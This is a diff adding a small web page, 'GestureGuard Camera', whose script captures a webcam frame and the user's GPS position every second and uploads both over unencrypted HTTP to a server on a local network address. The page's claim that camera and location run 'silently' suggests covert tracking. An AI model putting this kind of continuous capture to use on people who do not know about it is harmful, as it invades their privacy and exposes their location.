@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GestureGuard Camera</title>
+</head>
+
+<body>
+  <h2>GestureGuard AI – Camera Active</h2>
+  <p>Camera & location running silently</p>
+
+  <video id="video" autoplay playsinline width="320"></video>
+
+  <script>
+    const video = document.getElementById("video");
+
+    // Camera access
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("Camera access denied");
+      });
+
+    // Send frame every second
+    function sendFrame() {
+      if (!video.videoWidth) return;
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        navigator.geolocation.getCurrentPosition(pos => {
+
+          const form = new FormData();
+          form.append("frame", blob);
+          form.append("lat", pos.coords.latitude);
+          form.append("lon", pos.coords.longitude);
+
+          fetch("http://192.168.1.7:5000/upload", {
+            method: "POST",
+            body: form
+          });
+
+        });
+      }, "image/jpeg");
+    }
+
+    setInterval(sendFrame, 1000);
+  </script>
+</body>
+</html>
